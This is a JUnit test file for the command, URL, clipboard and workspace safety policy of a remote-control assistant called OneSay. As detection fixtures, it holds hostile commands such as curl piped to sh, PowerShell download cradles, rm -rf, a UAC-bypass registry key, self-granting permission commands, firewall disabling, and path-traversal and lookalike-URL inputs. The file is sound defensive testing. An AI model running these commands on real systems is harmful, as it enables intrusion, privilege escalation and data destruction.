package com.onesay.assistant.v2.pclink;

import static org.junit.Assert.assertEquals;
import static org.junit.Assert.assertFalse;
import static org.junit.Assert.assertNotNull;
import static org.junit.Assert.assertNull;
import static org.junit.Assert.assertTrue;

import com.onesay.assistant.v2.pclink.LinkPolicy.Cat;
import com.onesay.assistant.v2.pclink.LinkPolicy.Decision;
import com.onesay.assistant.v2.pclink.LinkPolicy.Facts;
import com.onesay.assistant.v2.pclink.LinkPolicy.Level;
import com.onesay.assistant.v2.pclink.LinkPolicy.Target;
import com.onesay.assistant.v2.pclink.LinkPolicy.Verdict;

import org.junit.Test;

import java.io.File;
import java.nio.file.Files;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collections;
import java.util.List;
import java.util.Map;
import java.util.TreeMap;

/** [link-v2 · 执行级别] 级别矩阵（电脑 / 手机两套）、给自己授权的红线、网址 / 剪贴板检查、工作区越界、生成脚本、确认超时。 */
public class LinkPolicyTest {

    static final Level RO = Level.READ_ONLY, AU = Level.AUTO, FU = Level.FULL;
    static final Verdict A = Verdict.ALLOW, C = Verdict.CONFIRM, D = Verdict.DENY, S = Verdict.SCRIPT;

    static Verdict v(Target t, Level l, Cat c) {
        return LinkPolicy.decide(t, l, c, new Facts()).verdict;
    }

    static void row(Target t, Cat c, Verdict ro, Verdict au, Verdict fu) {
        assertEquals(t + " " + c + " 只读", ro, v(t, RO, c));
        assertEquals(t + " " + c + " 自动", au, v(t, AU, c));
        assertEquals(t + " " + c + " 完全访问", fu, v(t, FU, c));
    }

    // ------------------------------------------------------------------ 级别矩阵

    /**
     * [恢复手机] 改：手机作为被控端回到分档之前（「只看控制台上的逐项开关」）—— 不再有只读 / 自动 / 完全访问之分，
     * 也不再在手机上弹确认、不按类别拦网址 / 剪贴板 / App。两条和分档无关的红线保留：给任何 App 授权只生成脚本、远程不能改 OneSay 自己的设置。
     */
    @Test public void phoneHasNoLevelsAnyMore() {
        Target t = Target.PHONE;
        for (Cat c : new Cat[]{Cat.QUERY, Cat.READ_PRIVATE, Cat.HARMLESS, Cat.SIMPLE_SETTING, Cat.NET_SEC_SETTING, Cat.OPEN_APP, Cat.OPEN_URL,
                Cat.CLIPBOARD_WRITE, Cat.WORKSPACE_WRITE, Cat.OUTSIDE_WRITE, Cat.UNINSTALL_APP, Cat.APP_OPERATE, Cat.RUN_WS_SCRIPT, Cat.SHELL_EXEC})
            row(t, c, A, A, A);
        row(t, Cat.SELF_GRANT, S, S, S);
        row(t, Cat.SELF_AUTHORIZE, D, D, D);
        row(t, Cat.UNKNOWN, D, D, D);
        // [第二轮] 改：手机仍不分档、不确认，但红线保留（用户决定 3）：网址过不了检查就不开（原来断言 127.0.0.1 → ALLOW）
        Facts f = new Facts();
        f.url = LinkPolicy.checkUrl("http://127.0.0.1/", TRUST);
        assertEquals(Verdict.DENY, LinkPolicy.decide(t, AU, Cat.OPEN_URL, f).verdict);
        assertEquals(LinkPolicy.R_UNTRUSTED_URL, LinkPolicy.decide(t, AU, Cat.OPEN_URL, f).reason);
        assertEquals(LinkPolicy.R_SELF_GRANT_BLOCKED, LinkPolicy.decide(t, AU, Cat.SELF_AUTHORIZE, null).reason);
    }

    /** 电脑作为被控端（手机→电脑）：两轴。这里只按旧三档的映射走一遍，完整矩阵在电脑端 PcPluginTest 里。 */
    @Test public void pcKeepsStrictMatrixThroughLegacyLevels() {
        Target t = Target.PC;
        row(t, Cat.QUERY, A, A, A);
        row(t, Cat.READ_PRIVATE, D, A, A);
        row(t, Cat.HARMLESS, D, A, A);
        row(t, Cat.SIMPLE_SETTING, D, C, C);
        row(t, Cat.POWER, D, C, C);
        row(t, Cat.SYSTEM_A, S, S, S);             // 要管理员：任何档位都只生成脚本
        row(t, Cat.NET_SEC_SETTING, S, S, S);
        // [两轴] 改：只读档不再生成脚本（只读 = 什么都不写）；完全访问档按当前用户权限（命令先确认、工作区外直接写）
        // [第二轮] 改：工作区可写档（旧「自动」）命令 / 工作区外写入从「只生成脚本」改成「确认后按你自己的权限执行」（用户决定 1）
        row(t, Cat.SHELL_EXEC, D, C, C);
        row(t, Cat.OUTSIDE_WRITE, D, C, A);
        row(t, Cat.OPEN_APP, D, A, A);
        row(t, Cat.WORKSPACE_WRITE, D, A, A);
        row(t, Cat.UNINSTALL_APP, D, C, C);
        row(t, Cat.APP_OPERATE, D, D, A);
        row(t, Cat.RUN_WS_SCRIPT, D, C, C);       // [第二轮] 改：工作区可写档跑工作区脚本 D → C（用户决定 1）
        row(t, Cat.SELF_GRANT, S, S, S);
        row(t, Cat.SELF_AUTHORIZE, D, D, D);       // [插件] 新：远程不能改 OneSay 自己的设置
        row(t, Cat.SYSTEM_APP_OP, D, D, D);
        row(t, Cat.UNKNOWN, D, D, D);
        // 两轴本身
        assertEquals(LinkPolicy.Sandbox.WORKSPACE_WRITE, LinkPolicy.Mode.DEFAULT.sandbox);
        assertEquals(LinkPolicy.Approval.UNTRUSTED, LinkPolicy.Mode.DEFAULT.approval);
        assertEquals(new LinkPolicy.Mode(LinkPolicy.Sandbox.FULL_ACCESS, LinkPolicy.Approval.ON_REQUEST), LinkPolicy.Mode.ofLegacy(FU));
        assertEquals(Level.AUTO, LinkPolicy.Mode.DEFAULT.legacy());
        assertEquals(Verdict.DENY, LinkPolicy.decide(t, new LinkPolicy.Mode(LinkPolicy.Sandbox.WORKSPACE_WRITE, LinkPolicy.Approval.NEVER), Cat.POWER, null).verdict);
        assertEquals(Verdict.ALLOW, LinkPolicy.decide(t, new LinkPolicy.Mode(LinkPolicy.Sandbox.FULL_ACCESS, LinkPolicy.Approval.NEVER), Cat.POWER, null).verdict);
    }

    @Test public void deniedByLevelReasonCode() {
        // [恢复手机] 改：原来测的是手机只读档 denied_by_level，手机已经没有档位了；改成电脑端的同一条
        Decision d = LinkPolicy.decide(Target.PC, RO, Cat.HARMLESS, null);
        assertEquals(LinkPolicy.R_DENIED_BY_LEVEL, d.reason);
        // [插件] 改：要管理员的原因码换成 needs_admin_script（B.10）
        assertEquals(LinkPolicy.R_NEEDS_ADMIN_SCRIPT, LinkPolicy.decide(Target.PC, FU, Cat.SYSTEM_A, null).reason);
        for (String code : new String[]{LinkPolicy.R_PLUGIN_BLOCKED, LinkPolicy.R_NEEDS_ADMIN_SCRIPT, LinkPolicy.R_SELF_GRANT_BLOCKED})
            assertFalse(code, LinkPolicy.reasonZh(code).isEmpty());
        assertEquals(Level.AUTO, Level.of(null));
        assertEquals(Level.AUTO, Level.of("garbage"));
        assertEquals(Level.FULL, Level.of("full"));
        assertEquals(Level.READ_ONLY, Level.of("只读"));
        assertEquals(Level.AUTO, LinkPolicy.DEFAULT_LEVEL);
    }

    /** [恢复手机] 改：禁止类 / 系统 App 的拦截只在电脑作被控端时生效（手机回到分档之前，由手机端自己的开关把关）。 */
    @Test public void blockedAndSystemAppsAtEveryLevel() {
        for (Target t : new Target[]{Target.PC}) {
            for (Level l : Level.values()) {
                Facts f = new Facts();
                f.appBlocked = true;
                for (Cat c : new Cat[]{Cat.OPEN_APP, Cat.UNINSTALL_APP, Cat.APP_OPERATE}) {
                    Decision d = LinkPolicy.decide(t, l, c, f);
                    assertEquals(t + " " + l + " " + c, Verdict.DENY, d.verdict);
                    assertEquals(LinkPolicy.R_BLOCKED_APP, d.reason);
                }
                Facts sys = new Facts();
                sys.appSystem = true;
                assertEquals(LinkPolicy.R_SYSTEM_APP, LinkPolicy.decide(t, l, Cat.UNINSTALL_APP, sys).reason);
                assertEquals(LinkPolicy.R_SYSTEM_APP, LinkPolicy.decide(t, l, Cat.APP_OPERATE, sys).reason);
            }
        }
        // 系统 App 只是「打开」不算改动
        Facts sys = new Facts();
        sys.appSystem = true;
        assertEquals(Verdict.ALLOW, LinkPolicy.decide(Target.PC, AU, Cat.OPEN_APP, sys).verdict);
        // [第二轮] 改：手机端支付 / 银行 / 钱包类 App 屏蔽是保留的红线（用户决定 3），原来断言 ALLOW
        Facts blocked = new Facts();
        blocked.appBlocked = true;
        assertEquals(Verdict.DENY, LinkPolicy.decide(Target.PHONE, AU, Cat.OPEN_APP, blocked).verdict);
        assertEquals(LinkPolicy.R_BLOCKED_APP, LinkPolicy.decide(Target.PHONE, AU, Cat.UNINSTALL_APP, blocked).reason);
    }

    @Test public void blockedAppList() {
        String[][] yes = {{"com.eg.android.AlipayGphone", ""}, {"com.chinamworld.main", ""}, {"cmb.pb", ""}, {"com.android.vending", ""},
                {"com.x8bit.bitwarden", ""}, {"com.google.android.packageinstaller", ""}, {"com.example.mybank", ""}, {"com.foo.wallet", ""},
                {"com.unknown.app", "招商银行"}, {"com.unknown.app2", "支付宝"}, {"com.unknown.app3", "应用商店"}, {"io.metamask", ""},
                {"com.xiaomi.market", ""}, {"com.samsung.android.spay", ""}};
        for (String[] y : yes) assertTrue(y[0] + " " + y[1], LinkPolicy.blockedApp(y[0], y[1]));
        String[][] no = {{"com.tencent.mm", "微信"}, {"tv.danmaku.bili", "哔哩哔哩"}, {"com.android.chrome", "Chrome"}, {"com.netease.cloudmusic", "网易云音乐"},
                {"com.example.display", "Display"}, {"com.supermarket.app", "超市"}};
        for (String[] n : no) assertFalse(n[0], LinkPolicy.blockedApp(n[0], n[1]));
    }

    // ------------------------------------------------------------------ 不给自己授权

    @Test public void selfGrantIsScriptOnlyAtEveryLevelOnBothTargets() {
        String[] cmds = {"pm grant com.onesay.assistant android.permission.READ_SMS", "appops set com.onesay.assistant SYSTEM_ALERT_WINDOW allow",
                "cmd appops set com.x RUN_IN_BACKGROUND allow",
                "settings put secure enabled_accessibility_services com.onesay.assistant/.A11y", "settings put secure accessibility_enabled 1",
                "settings put secure enabled_notification_listeners com.x/.L", "cmd notification allow_listener com.x/.L",
                "dpm set-active-admin com.x/.Admin", "dpm set-device-owner com.x/.Admin", "sh /sdcard/Android/data/moe.shizuku.privileged.api/start.sh",
                "rish -c 'whatever' # shizuku", "pm set-permission-flags com.x p user-fixed", "su -c pm grant com.x android.permission.CAMERA",
                "  PM   GRANT com.x android.permission.CAMERA"};
        for (String c : cmds) {
            for (Target t : Target.values()) {
                assertEquals(c + " @" + t, Cat.SELF_GRANT, LinkPolicy.classifyShell(t, c));
                for (Level l : Level.values()) {
                    Decision d = LinkPolicy.decide(t, l, LinkPolicy.classifyShell(t, c), new Facts());
                    assertEquals(c + " @" + t + "/" + l, Verdict.SCRIPT, d.verdict);
                }
            }
        }
        for (String n : new String[]{"accessibility", "notification_listener", "device_admin", "permission", "appops", "shizuku"}) {
            assertEquals(n, Cat.SELF_GRANT, LinkPolicy.phoneSettingCat(n));
            for (Level l : Level.values()) assertEquals(Verdict.SCRIPT, v(Target.PHONE, l, LinkPolicy.phoneSettingCat(n)));
        }
        // [插件] 新：远程想改 OneSay 自己的设置，两个被控端都拒
        for (Target t : Target.values())
            for (Level l : Level.values()) assertEquals(Verdict.DENY, v(t, l, Cat.SELF_AUTHORIZE));
        // 电脑上的授权类（ACL / Defender 排除 / 本地管理员组）同样只生成脚本
        for (String c : new String[]{"icacls C:\\x /grant Everyone:F", "Add-MpPreference -ExclusionPath C:\\", "net localgroup administrators bob /add"})
            assertEquals(c, Cat.SELF_GRANT, LinkPolicy.classifyShell(Target.PC, c));
    }

    @Test public void shellClassification() {
        // [插件 / B.3] 改：HKCU 普通键现在放行（普通用户自己能做）；HKLM 等要管理员的仍是 SYSTEM_A（只生成脚本）
        assertEquals(Cat.SYSTEM_A, LinkPolicy.classifyShell(Target.PC, "reg add HKLM\\Software\\X /v Y /d 1"));
        assertEquals(Cat.SHELL_EXEC, LinkPolicy.classifyShell(Target.PC, "reg add HKCU\\Software\\MyApp /v Y /d 1"));
        assertEquals("能影响提权的 HKCU 键仍然要管理员脚本", Cat.SYSTEM_A,
                LinkPolicy.classifyShell(Target.PC, "reg add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /ve /d cmd /f"));
        assertEquals(Cat.SYSTEM_A, LinkPolicy.classifyShell(Target.PC, "netsh advfirewall set allprofiles state off"));
        assertEquals(Cat.SYSTEM_A, LinkPolicy.classifyShell(Target.PC, "Set-DnsClientServerAddress -InterfaceIndex 3 -ServerAddresses 8.8.8.8"));
        assertEquals(Cat.SYSTEM_A, LinkPolicy.classifyShell(Target.PC, "sc config wuauserv start= disabled"));
        assertEquals(Cat.SYSTEM_A, LinkPolicy.classifyShell(Target.PC, "notepad C:\\Windows\\System32\\drivers\\etc\\hosts"));
        assertEquals("[插件] 改：HKCU 普通键放行", Cat.SHELL_EXEC, LinkPolicy.classifyShell(Target.PC, "Set-ItemProperty -Path HKCU:\\Software\\X -Name Y -Value 1"));
        assertEquals(Cat.SYSTEM_A, LinkPolicy.classifyShell(Target.PC, "pnputil /add-driver x.inf"));
        assertEquals(Cat.SHELL_EXEC, LinkPolicy.classifyShell(Target.PC, "dir C:\\"));
        assertEquals(Cat.SIMPLE_SETTING, LinkPolicy.classifyShell(Target.PHONE, "settings put system screen_brightness 120"));
        assertEquals(Cat.SIMPLE_SETTING, LinkPolicy.classifyShell(Target.PHONE, "svc wifi disable"));
        assertEquals(Cat.SIMPLE_SETTING, LinkPolicy.classifyShell(Target.PHONE, "svc bluetooth enable"));
        assertEquals(Cat.NET_SEC_SETTING, LinkPolicy.classifyShell(Target.PHONE, "settings put global airplane_mode_on 1"));
        assertEquals(Cat.NET_SEC_SETTING, LinkPolicy.classifyShell(Target.PHONE, "svc data disable"));
        assertEquals(Cat.SHELL_EXEC, LinkPolicy.classifyShell(Target.PHONE, "settings put system screen_brightness 120; rm -rf /sdcard/x"));
        assertEquals("拼接命令不按其中一段放宽", Cat.SHELL_EXEC, LinkPolicy.classifyShell(Target.PHONE, "svc wifi disable && reboot"));
        assertEquals(Cat.SHELL_EXEC, LinkPolicy.classifyShell(Target.PHONE, "pm uninstall com.android.systemui"));
        assertEquals(Cat.SHELL_EXEC, LinkPolicy.classifyShell(Target.PHONE, "reboot"));
        assertEquals(Cat.UNKNOWN, LinkPolicy.classifyShell(Target.PHONE, "  "));
        assertEquals(Cat.SIMPLE_SETTING, LinkPolicy.phoneSettingCat("wifi"));
        assertEquals(Cat.SIMPLE_SETTING, LinkPolicy.phoneSettingCat("Brightness"));
        assertEquals(Cat.NET_SEC_SETTING, LinkPolicy.phoneSettingCat("private_dns"));
        assertEquals(Cat.UNKNOWN, LinkPolicy.phoneSettingCat("format_disk"));
        // 指令名 → 类别
        assertEquals(Cat.HARMLESS, LinkPolicy.phoneCat("find_phone"));
        assertEquals(Cat.HARMLESS, LinkPolicy.phoneCat("flashlight"));
        assertEquals(Cat.QUERY, LinkPolicy.phoneCat("status"));
        assertEquals(Cat.UNKNOWN, LinkPolicy.phoneCat("rm_rf"));
        assertEquals("电脑快捷指令单独一类", Cat.SHORTCUT, LinkPolicy.pcCat("shortcut_run"));
        assertEquals("[插件] 新：远程想改电脑端自己的设置", Cat.SELF_AUTHORIZE, LinkPolicy.pcCat("settings"));
        assertEquals(Cat.RUN_WS_SCRIPT, LinkPolicy.pcCat("script_run"));
        assertEquals(Cat.POWER, LinkPolicy.pcCat("shutdown"));
        assertEquals(Cat.SIMPLE_SETTING, LinkPolicy.pcCat("volume"));
        assertEquals("电脑端没登记的新指令一律不认", Cat.UNKNOWN, LinkPolicy.pcCat("format_c"));
    }

    // ------------------------------------------------------------------ 网址

    static final List<String> TRUST = Arrays.asList("bilibili.com", "192.168.1.10", "nas.lan");

    @Test public void urlScheme() {
        for (String u : new String[]{"intent://scan/#Intent;scheme=zxing;end", "file:///sdcard/a.txt", "content://media/external/1", "javascript:alert(1)",
                "data:text/html,<b>x</b>", "market://details?id=x", "weixin://dl/scan", "ftp://a.com/x", "//a.com", "a.com", "HTTPS:/a.com"}) {
            LinkPolicy.UrlCheck c = LinkPolicy.checkUrl(u, TRUST);
            assertFalse(u, c.ok);
        }
        assertTrue(LinkPolicy.checkUrl("https://www.example.com/a?b=c#d", TRUST).ok);
        assertTrue(LinkPolicy.checkUrl("HTTP://Example.COM:8080/x", TRUST).ok);
        assertEquals("example.com", LinkPolicy.checkUrl("HTTP://Example.COM:8080/x", TRUST).host);
    }

    @Test public void urlCredentialsIpAndPrivate() {
        assertFalse(LinkPolicy.checkUrl("https://user:pass@example.com/", TRUST).ok);
        assertFalse(LinkPolicy.checkUrl("https://example.com@evil.com/", TRUST).ok);
        assertTrue(LinkPolicy.checkUrl("https://user:pass@example.com/", TRUST).why.contains("账号密码"));
        assertFalse(LinkPolicy.checkUrl("https://bilibili.com\\@evil.com/", TRUST).ok);
        for (String u : new String[]{"http://10.0.0.1/", "http://127.0.0.1:8080/", "http://[::1]/", "http://2130706433/", "http://0x7f000001/", "http://127.1/",
                "http://localhost/", "http://router/", "http://printer.local/", "http://x.internal/"}) {
            assertFalse(u, LinkPolicy.checkUrl(u, TRUST).ok);
        }
        LinkPolicy.UrlCheck lan = LinkPolicy.checkUrl("http://192.168.1.10:5000/", TRUST);
        assertTrue("用户放进信任列表的 IP 放行", lan.ok && lan.trusted);
        assertTrue(LinkPolicy.checkUrl("http://nas.lan/", TRUST).ok);
        assertFalse("没在列表里的同网段 IP 照样拒", LinkPolicy.checkUrl("http://192.168.1.11/", TRUST).ok);
        StringBuilder b = new StringBuilder("https://a.com/");
        while (b.length() <= LinkPolicy.URL_MAX) b.append('x');
        assertFalse("超长", LinkPolicy.checkUrl(b.toString(), TRUST).ok);
        assertFalse("控制字符", LinkPolicy.checkUrl("https://a.com/\u202ecod.exe", TRUST).ok);
        assertFalse(LinkPolicy.checkUrl("https://a.com /x", TRUST).ok);
    }

    @Test public void urlLookalikes() {
        // 西里尔 а（U+0430）混进拉丁
        assertFalse(LinkPolicy.checkUrl("https://p\u0430ypal.com/", TRUST).ok);
        // 整段西里尔但全长得像拉丁：аррӏе = apple
        LinkPolicy.UrlCheck apple = LinkPolicy.checkUrl("https://\u0430\u0440\u0440\u04cf\u0435.com/", TRUST);
        assertFalse(apple.ok);
        assertTrue(apple.why, apple.why.contains("仿冒"));
        // punycode 形式同样认出来（xn--80ak6aa92e = аррӏе）
        assertFalse(LinkPolicy.checkUrl("https://xn--80ak6aa92e.com/", TRUST).ok);
        assertFalse("希腊字母混拉丁", LinkPolicy.checkUrl("https://g\u03bfogle.com/", TRUST).ok);
        // 正常 IDN：中文域名、日文混排
        LinkPolicy.UrlCheck zh = LinkPolicy.checkUrl("https://例子.中国/", TRUST);
        assertTrue(zh.why, zh.ok);
        assertTrue(zh.shown, zh.shown.contains("xn--"));
        assertTrue(LinkPolicy.checkUrl("https://東京タワー.jp/", TRUST).ok);
        assertTrue("真正的俄语域名（有不像拉丁的字母）不算仿冒", LinkPolicy.checkUrl("https://\u043f\u0440\u0438\u043c\u0435\u0440.\u0440\u0444/", TRUST).ok);
    }

    /** [恢复手机] 改：网址 / 剪贴板的判定现在只在电脑作被控端时生效，断言里的 Target 从 PHONE 换成 PC；检查函数本身没变。 */
    @Test public void urlTrustDecisions() {
        Facts f = new Facts();
        f.url = LinkPolicy.checkUrl("https://www.bilibili.com/video/1", TRUST);
        assertTrue(f.url.trusted);
        assertEquals("信任域名（含子域）自动档直接开", Verdict.ALLOW, LinkPolicy.decide(Target.PC, AU, Cat.OPEN_URL, f).verdict);
        f.url = LinkPolicy.checkUrl("https://evilbilibili.com/", TRUST);
        assertFalse("后缀相同但不是子域", f.url.trusted);
        Decision d = LinkPolicy.decide(Target.PC, AU, Cat.OPEN_URL, f);
        assertEquals(Verdict.CONFIRM, d.verdict);
        assertTrue("确认里突出域名", d.text.contains("evilbilibili.com"));
        Decision full = LinkPolicy.decide(Target.PC, FU, Cat.OPEN_URL, f);
        assertEquals(Verdict.ALLOW, full.verdict); // 完全访问 = 按需审批：不问，只提醒
        assertTrue("完全访问：不在信任列表也提个醒", full.headsUp);
        assertEquals(Verdict.DENY, LinkPolicy.decide(Target.PC, RO, Cat.OPEN_URL, f).verdict);
        f.url = LinkPolicy.checkUrl("javascript:alert(1)", TRUST);
        for (Level l : new Level[]{AU, FU}) assertEquals(LinkPolicy.R_UNTRUSTED_URL, LinkPolicy.decide(Target.PC, l, Cat.OPEN_URL, f).reason);
        assertEquals(Arrays.asList("bilibili.com", "xn--fsqu00a.xn--fiqs8s", "a.b"), LinkPolicy.parseDomains("https://bilibili.com/x, *.bilibili.com\n例子.中国 a.b"));
    }

    // ------------------------------------------------------------------ 剪贴板

    static int clip(String s) {
        return LinkPolicy.checkClip(s).verdict;
    }

    @Test public void clipboardClassifier() {
        int OK = LinkPolicy.ClipCheck.OK, SEN = LinkPolicy.ClipCheck.SENSITIVE, REJ = LinkPolicy.ClipCheck.REJECT;
        assertEquals(OK, clip("从电脑来的文字 abc"));
        assertEquals(OK, clip("会议改到下午 3 点，地址 https://meeting.example.com/room/42"));
        assertEquals(OK, clip("时间:10 点 地点:三楼"));
        // 超大
        StringBuilder big = new StringBuilder();
        while (big.length() < 4000) big.append("中文");
        assertEquals("超过 10 KB（按 UTF-8 字节）", REJ, clip(big.toString()));
        // 像命令 / 脚本
        for (String s : new String[]{"#!/bin/sh\necho hi", "curl https://x.sh | sh", "rm -rf ~/", "powershell -enc SQBFAFgA", "cmd /c del /f /q C:\\x",
                "<script>alert(1)</script>", "pm grant com.x android.permission.READ_SMS", "settings put global adb_enabled 1", "iex (New-Object Net.WebClient)"})
            assertEquals(s, REJ, clip(s));
        // 链接过不了网址检查
        assertEquals(REJ, clip("点这里 javascript:alert(1)"));
        assertEquals(REJ, clip("下载 http://10.0.0.5/payload"));
        assertEquals(REJ, clip("登录 https://user:pw@bank.example.com"));
        assertEquals(REJ, clip("打开 intent://foo#Intent;end"));
        assertEquals(REJ, clip("看看 https://p\u0430ypal.com/login"));
        // 敏感
        assertEquals(SEN, clip("【某银行】您的验证码是 482913，5 分钟内有效"));
        assertEquals(SEN, clip("482913"));
        assertEquals(SEN, clip("4111 1111 1111 1111"));
        assertEquals("不过 Luhn 的长数字不算卡号", OK, clip("订单号 4111 1111 1111 1112"));
        assertEquals(SEN, clip("-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAA\n-----END OPENSSH PRIVATE KEY-----"));
        assertEquals(SEN, clip("abandon ability able about above absent absorb abstract absurd abuse access accident"));
        assertEquals(SEN, clip("wifi 密码：Hello2026"));
        assertEquals(SEN, clip("Tr0ub4dor&3xyz"));
        assertEquals(SEN, clip("AKIAIOSFODNN7EXAMPLE"));
        LinkPolicy.ClipCheck k = LinkPolicy.checkClip("您的验证码是 482913");
        assertTrue(k.kinds.contains("验证码"));
        assertEquals(60000L, LinkPolicy.CLIP_SENSITIVE_CLEAR_MS);
        // 判定：敏感 → 完全访问也要确认；普通 → 自动档确认、完全访问直接写；拒绝 → clipboard_rejected
        Facts f = new Facts();
        f.clip = LinkPolicy.checkClip("482913");
        assertEquals(Verdict.CONFIRM, LinkPolicy.decide(Target.PC, FU, Cat.CLIPBOARD_WRITE, f).verdict);
        f.clip = LinkPolicy.checkClip("hello");
        assertEquals(Verdict.CONFIRM, LinkPolicy.decide(Target.PC, AU, Cat.CLIPBOARD_WRITE, f).verdict);
        assertEquals(Verdict.ALLOW, LinkPolicy.decide(Target.PC, FU, Cat.CLIPBOARD_WRITE, f).verdict);
        f.clip = LinkPolicy.checkClip("rm -rf /");
        assertEquals(LinkPolicy.R_CLIPBOARD_REJECTED, LinkPolicy.decide(Target.PC, FU, Cat.CLIPBOARD_WRITE, f).reason);
        assertTrue(LinkPolicy.luhn("4111111111111111"));
        assertFalse(LinkPolicy.luhn("4111111111111112"));
    }

    // ------------------------------------------------------------------ 工作区

    static File tmpDir() throws Exception {
        return Files.createTempDirectory("lv2ws").toFile().getCanonicalFile();
    }

    @Test public void workspaceContainment() throws Exception {
        File root = tmpDir();
        assertNotNull(LinkPolicy.resolveInside(root, "notes/a.txt"));
        assertNotNull(LinkPolicy.resolveInside(root, "notes\\b.txt"));
        assertNotNull(LinkPolicy.resolveInside(root, "./c.txt"));
        assertEquals(new File(root, "notes/a.txt").getPath(), LinkPolicy.resolveInside(root, "notes/./a.txt").getPath());
        String[] bad = {"", "   ", "../x", "a/../../x", "a/../b/../../x", "..", "..\\x", "a\\..\\..\\x", "/etc/passwd", "\\Windows\\x",
                "C:\\Windows\\System32\\x", "C:x.txt", "c:/x", "D:", "\\\\server\\share\\x", "//server/share/x", "\\\\?\\C:\\x", "\\\\.\\PhysicalDrive0",
                "~/x", "a.txt:stream", "CON", "nul.txt", "COM1", "lpt1.log", "a\u0000b", "a/b?.txt", "a/*", "sp /x ", "a/...", "a/b."};
        for (String b : bad) assertNull("应拒：" + b.replace("\u0000", "\\0"), LinkPolicy.resolveInside(root, b));
        assertNull(LinkPolicy.resolveInside(null, "a"));
        assertNull(LinkPolicy.resolveInside(root, null));
    }

    @Test public void workspaceSymlinkEscapeIsRejected() throws Exception {
        File root = tmpDir();
        File outside = tmpDir();
        try {
            Files.createSymbolicLink(new File(root, "link").toPath(), outside.toPath());
            Files.createSymbolicLink(new File(root, "flink").toPath(), new File(outside, "secret.txt").toPath());
        } catch (Exception e) {
            org.junit.Assume.assumeNoException("文件系统不支持符号链接", e);
        }
        assertNull("目录符号链接跳出工作区", LinkPolicy.resolveInside(root, "link/x.txt"));
        assertNull("文件符号链接指到工作区外", LinkPolicy.resolveInside(root, "flink"));
        assertNull(LinkPolicy.writeInside(root, "link/evil.txt", "x".getBytes("UTF-8")));
        assertFalse(new File(outside, "evil.txt").exists());
        // 工作区内部的符号链接没问题
        new File(root, "real").mkdirs();
        Files.createSymbolicLink(new File(root, "inner").toPath(), new File(root, "real").toPath());
        assertNotNull(LinkPolicy.resolveInside(root, "inner/ok.txt"));
        File w = LinkPolicy.writeInside(root, "deep/er/f.txt", "hi".getBytes("UTF-8"));
        assertNotNull(w);
        assertEquals("hi", new String(Files.readAllBytes(w.toPath()), "UTF-8"));
    }

    @Test public void pcWorkspaceDirFallsBackForNonAsciiProfile() {
        assertEquals("C:\\Users\\bob\\OneSay\\workspace", LinkPolicy.pcWorkspaceDir("C:\\Users\\bob", "C:\\ProgramData"));
        assertEquals("C:\\Users\\bob\\OneSay\\workspace", LinkPolicy.pcWorkspaceDir("C:\\Users\\bob\\", null));
        assertEquals("中文用户名退到 ProgramData", "C:\\ProgramData\\OneSay\\workspace", LinkPolicy.pcWorkspaceDir("C:\\Users\\刘泓江", "C:\\ProgramData"));
        assertEquals("D:\\PD\\OneSay\\workspace", LinkPolicy.pcWorkspaceDir("C:\\Users\\José", "D:\\PD"));
        assertEquals("C:\\ProgramData\\OneSay\\workspace", LinkPolicy.pcWorkspaceDir(null, null));
        assertEquals("C:\\ProgramData\\OneSay\\workspace", LinkPolicy.pcWorkspaceDir("", ""));
    }

    // ------------------------------------------------------------------ 生成脚本

    @Test public void scriptGeneration() throws Exception {
        File root = tmpDir();
        long now = 1794200000000L;
        LinkPolicy.Script sh = LinkPolicy.buildScript(LinkPolicy.ScriptKind.SH, "grant perm", "给 App 授权\n# 伪造的行", "改权限", "pm grant com.x android.permission.CAMERA", now);
        assertTrue(sh.relPath, sh.relPath.startsWith("scripts/") && sh.relPath.endsWith("-grant-perm.sh"));
        assertTrue(sh.content.startsWith("#!/system/bin/sh\n"));
        assertTrue(sh.content.contains("# 由 OneSay 远程指令生成，没有执行"));
        assertTrue(sh.content.contains("# 风险：改权限"));
        assertTrue("头注释里的换行被压平，不能伪造出新行", sh.content.contains("# 做什么：给 App 授权 # 伪造的行"));
        assertTrue(sh.content.contains("\npm grant com.x android.permission.CAMERA\n"));
        assertFalse(sh.content.contains("Bixby") || sh.content.contains("三星"));

        LinkPolicy.Script ps = LinkPolicy.buildScript(LinkPolicy.ScriptKind.PS1, "关防火墙", "关闭防火墙", "电脑暴露在局域网", "netsh advfirewall set allprofiles state off", now);
        assertTrue("中文标题没有 ASCII 时用 task", ps.relPath.endsWith("-task.ps1"));
        assertTrue(ps.content.startsWith("# 由 OneSay"));
        assertTrue(ps.content.contains("PowerShell"));
        LinkPolicy.Script bat = LinkPolicy.buildScript(LinkPolicy.ScriptKind.BAT, "dns", "改 DNS", "断网", "netsh interface ip set dns \"Wi-Fi\" static 1.1.1.1\nipconfig /flushdns", now);
        assertTrue(bat.content.startsWith("@echo off\r\nchcp 65001 >nul\r\nREM 由 OneSay"));
        assertTrue(bat.content.contains("1.1.1.1\r\nipconfig /flushdns\r\n"));

        String rel = LinkPolicy.writeScript(root, sh);
        assertEquals(sh.relPath, rel);
        assertEquals(sh.content, new String(Files.readAllBytes(new File(root, rel).toPath()), "UTF-8"));
        String prel = LinkPolicy.writeScript(root, ps);
        byte[] pb = Files.readAllBytes(new File(root, prel).toPath());
        assertTrue(".ps1 带 UTF-8 BOM", (pb[0] & 0xff) == 0xEF && (pb[1] & 0xff) == 0xBB && (pb[2] & 0xff) == 0xBF);
        assertNotNull(LinkPolicy.writeScript(root, bat));
        List<String> ls = LinkPolicy.listScripts(root);
        assertEquals(3, ls.size());
        new File(root, "scripts/readme.txt").createNewFile();
        assertEquals("只列 .sh / .ps1 / .bat", 3, LinkPolicy.listScripts(root).size());
        assertEquals(Collections.<String>emptyList(), LinkPolicy.listScripts(tmpDir()));
    }

    // ------------------------------------------------------------------ [恢复手机] 删：PcRx.Gate / ConfirmBox 相关
    // 原来这里有 GateStub（桩）、gatedHandleReasonCodes、confirmBoxTimeoutIsDeny，测的是手机端的执行级别（级别矩阵 / 手机上确认 /
    // 生成脚本 / 新增 8 个指令）。手机恢复到分档之前后 PcRx.Gate 和 ConfirmBox 都不存在了，这两项没有被测对象，删除；
    // 手机端现在的行为（只看逐项开关）由下面这项和 PcLinkV2Test 覆盖。

    static Map<String, Object> m(Object... kv) {
        Map<String, Object> x = new TreeMap<String, Object>();
